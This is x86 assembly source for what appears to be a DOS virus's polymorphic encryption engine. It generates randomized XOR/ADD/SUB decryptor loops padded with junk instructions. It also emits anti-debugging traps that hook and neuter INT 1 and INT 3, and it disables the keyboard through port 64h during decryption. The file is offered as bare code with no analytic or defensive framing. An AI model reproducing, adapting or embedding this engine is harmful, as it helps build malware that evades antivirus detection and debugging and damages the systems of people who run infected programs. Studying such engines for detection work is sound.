   engine:
       _ax = 0
       _cx = 1
       _dx = 2
       _bx = 3
       _sp = 4
       _bp = 5
       _si = 6
       _di = 7
       mov $di, di
       mov $cx, cx
       mov $si, si
       mov $ax, ax
       mov 1 ptr cs:reg1, -1
       ;----------[ Start]---
       call gen_garbage
       mov  ax, 0
       org  $-2
       mov  al, 0ADh
       stosw
       mov  1 ptr cs:reg1, _ax
       call gen_garbage
       mov  ax, 0
       org  $-2
       out  64h, al
       stosw
       mov  1 ptr cs:reg1, -1
       call gen_garbage
       call not_trace
       call gen_garbage
       mov ax, 4
       call random
       ; 3 5 6 7
       cmp al, 0
       jnz __1
       mov al, 3
       jmp __2
   __1:
       add al, 5-1
   __2:
       mov cs:reg1, al
       ; mov reg, offset body
       call load
       push di
       call gen_garbage
       mov al, 2Eh
       stosb
       mov ax, 3
       call random
       shl al, 1
       mov bx, ax
       mov ax, 2 ptr cs:[bx+decrypt_inst]
       mov cs:_crypt, ax
       add bx, offset crypt_inst
       mov al, 1 ptr cs:[bx]
       stosb
       mov al, 0
   reg1 equ byte ptr $-1
       ; _bx _si _di _bp
       ;  3   0   1   2
       ;  3   6   7   5
       cmp al, _bx
       jz  __4
   __3:
       cmp al, _si
       jnz __5
       mov al, 0
       jmp __4
   __5:
       cmp al, _di
       jnz __6
       mov al, 1
       jmp __4
   __6:
       mov al, 2
   __4:
       or  al, cs:[bx+1]
       stosb
   ; ->
       mov  cs:ofs_body, di ; ofs
       stosw
   $$1:
       mov  ax, -1
       call random
       test ax, ax
       jz   $$1
       stosw
       mov  cs:key, ax ; key
       call gen_garbage
       ;-------[ Inc ]---
       mov al, 40h
       or  al, cs:reg1
       stosb
       push ax
       call gen_garbage
       pop  ax
       stosb
       call gen_garbage
       ;--------[ Cmp ]---
       mov al, 10000001b
       stosb
       mov al, 11111000b
       or  al, cs:reg1
       stosb
   ; ->
       mov cs:max_ofs, di
       stosw
       ;--------[ Jne ]---
       mov al, 75h
       stosb
       pop ax
       push ax
       sub ax, di
       dec ax
       cmp ax, not 80h
       ja  _$1
       mov 1 ptr es:[di-1], 74h
       mov 1 ptr es:[di],   03h
       mov 1 ptr es:[di+1], 0E9h
       inc di
       inc di
       sub ax, 3
       stosw
       jmp  _$2
   _$1:
       stosb
   _$2:
       ;------------------
       call gen_garbage
       mov  ax, 0
       org  $-2
       mov  al, 0AEh
       stosw
       mov  1 ptr cs:reg1, _ax
       call gen_garbage
       mov  ax, 0
       org  $-2
       out  64h, al
       stosw
       mov  1 ptr cs:reg1, -1
       call gen_garbage
       ;----------------
       mov bx, di
       sub bx, offset buffer
   $di equ 2 ptr $-2
       pop si
   $$2:
       mov ax, -1
       call random
       cmp  ax, 8000h
       jb   $$3
       test ax, 1
       ; and ax, 1
       jnz  $$2
   $$3:
       xchg ax, dx
       mov ax, bx
       add ax, 100h
   $ax equ 2 ptr $-2
       add ax, dx
       mov 2 ptr es:[si-2], ax
       neg dx
       mov bx, 0
   ofs_body equ 2 ptr $-2
       mov 2 ptr es:[bx], dx
       mov cx, 1234h
   $cx equ 2 ptr $-2
       shl cx, 1
       add ax, cx
       mov bx, 0
   max_ofs equ 2 ptr $-2
       mov 2 ptr es:[bx], ax
       mov si, 0
   $si equ 2 ptr $-2
       mov cx, $cx
       mov bx, 0
   key equ 2 ptr $-2
   __x:
       lodsw
   _crypt dw 0
       stosw
       loop __x
       mov cx, di
       sub cx, cs:$di
       ret

   load proc
       push ax
       mov ax, 2
       call random
       test ax, ax
       pop ax
       jz  fuck_it
       shl al, 3
       or  al, 06h
       xchg al, ah
       mov al, 8Dh
       stosw
       jmp __fuck_it
   fuck_it:
       or al, 0B8h
       stosb
   __fuck_it:
       xchg ax, dx
       stosw
       ret
       endp

   not_trace proc
        mov ax, 2
        call random
        test ax, ax
        jz  __1
        call anti_1
        call gen_garbage
        call anti_2
        jmp __2
   __1:
        call anti_2
        call gen_garbage
        call anti_1
   __2:
        mov dx, 3521h
        mov al, 0
        call load
        mov  ax, 21CDh
        stosw
        mov  cs:reg1, _bx
        call gen_garbage
        mov  ax, 0
        org  $-2
        mov  al, 0CFh
        stosw
        mov  cs:regX, _ax
        call gen_garbage
        mov  ax, 8626h
        stosw
        mov  al, 7
        stosb
        call gen_garbage
        mov  ax, 4CB4h
        stosw
        call gen_garbage
        mov  ax, 21CDh
        stosw
        call gen_garbage
        mov  ax, 2
        call random
        test ax, ax
        mov  ah, 86h
        jnz  __m
        mov  ah, 88h
   __m:
        mov  al, 26h
        stosw
        mov  al, 7
        stosb
   ; B0 CF             mov al, 0CFh
   ; 26: 86 07         xchg al, 1 ptr es:[bx]
   ; B4 4C             mov  ah, 4Ch
   ; CD 21             int  21h
   ; 26: 88 07         mov  1 ptr es:[bx], al
        mov  cs:reg1, -1
        mov  cs:regX, -1
        call gen_garbage
        ret
   anti_1:
        mov dx, 3501h
   _anti_x:
        mov al, 0
        call load
        mov  ax, 21CDh
        stosw
        mov  cs:reg1, _bx
        call gen_garbage
        mov  ax, 0C626h
        stosw
        mov  ax, 0CF07h
        stosw
        mov  cs:reg1, -1
        call gen_garbage
        ret
   anti_2:
        mov dx, 3503h
        jmp _anti_x
        endp

   crypt_inst:
        db 10000001b,10110100b
        db 10000001b,10000100b
        db 10000001b,10101100b
   decrypt_inst:
        xor ax, bx
        sub ax, bx
        add ax, bx

   gen_garbage:
        push dx
        mov ax, 10
        call random
        inc ax
        xchg ax, cx
   __1:
        push cx
        call garage
        pop  cx
        loop __1
        pop dx
        ret
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   big_garbage:
   ; ADD/SUB/XOR/ROL/TEST/CMP...
   IZM_1 = 1
   IZM_0 = 0
   IZM_2 = 2
       db 10001011b, IZM_1 ; mov
       db 00000011b, IZM_1 ; add
       db 00010011b, IZM_1 ; adc
       db 00100011b, IZM_1 ; and
       db 00001011b, IZM_1 ; or
       db 00101011b, IZM_1 ; sub
       db 00011011b, IZM_1 ; sbb
       db 00110011b, IZM_1 ; xor
       db 00111011b, IZM_0 ; cmp
       db 10000101b, IZM_0 ; test
       db 11010001b, IZM_2 ; rxx ®â 0..7 ªà®¬¥ 6
   len_big_garbage = ($-big_garbage)/2

   free_reg:
        mov ax, 8
        call random
        cmp al, cs:reg1
        jz  free_reg
        cmp al, 4
        jz  free_reg
        cmp al, 0ffh
   regX equ byte ptr $-1
        jz  free_reg
        ret

   gen_mov:
        mov ax, 0fffeh
        call random
        xchg ax, dx
        call free_reg
        jmp  load

   gen_byte:
          push bx
          mov ax, ob_len
          call random
          lea bx, one_byte
          xlat byte ptr cs:[bx]
          stosb
          pop bx
          ret

   garage:
        mov ax, len_big_garbage+2
        call random
        cmp al, len_big_garbage
        jz  gen_byte
        cmp al, len_big_garbage+1
        jz  gen_mov
        shl ax, 1
        add ax, offset big_garbage
        mov bx, ax
        mov al, cs:[bx]
        stosb
        mov al, cs:[bx+1]
        cmp al, 2
        jnz _standart
   __k:
        mov ax, 8
        call random
        cmp al, 6
        jz  __k
        shl al, 3
        or  al, 0C0h
        mov bl, al
        call free_reg
        or  al, bl
        stosb
        ret
   _standart:
        push ax
        mov  ax, 4
        call random
        sub  dl, dl
        cmp  al, 3
        jz   $$0
        dec  di
        mov  ah, es:[di]
        lea  bx, prefix
        xlat 1 ptr cs:[bx]
        stosb
        mov  al, ah
        stosb
        inc dl
   $$0:
        pop  ax
        cmp al, 0
        jnz not_change
        mov ax, 8
        call random
        jmp mumu
   not_change:
        call free_reg
   mumu:
        shl al, 3
        push ax
        mov ax, 2
        call random
        test ax, ax
        pop ax
        jz __p
        test dl, dl
        jz  __op
        ; Prefix, Command
        mov ah, es:[di-1]
        mov 1 ptr es:[di-2], ah
        dec di
   __op:
        or al, 0C0h
        stosb
        mov ax, 8
        call random
        or 1 ptr es:[di-1], al
        ret
   __p:
        ; al -reg
        or  al, 110b
        stosb
        mov  ax, 0FFFEh
        call random
        stosw
        ret
   prefix:
        segss
        segcs
        seges

